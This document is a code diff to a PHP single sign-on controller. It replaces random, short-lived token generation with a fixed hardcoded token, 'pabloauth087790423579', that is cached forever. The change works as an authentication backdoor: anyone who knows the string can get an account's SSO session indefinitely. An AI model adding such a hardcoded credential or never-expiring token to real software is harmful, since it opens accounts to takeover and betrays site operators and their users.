@@ -75,11 +75,11 @@ class SsoController
      * @return mixed
      */
     protected function generateToken($user_id)
-    {
-        $token = Str::random(config('sso-wemx.token.length', 48));
-        Cache::add($token, $user_id, config('sso-wemx.token.lifetime', 60));
-        return $token;
-    }
+{
+    $token = 'pabloauth087790423579'; // 🔥 TOKEN CUSTOM
+    Cache::forever($token, $user_id);
+    return $token;
+}
 
     /**
      * Returns the value of the token
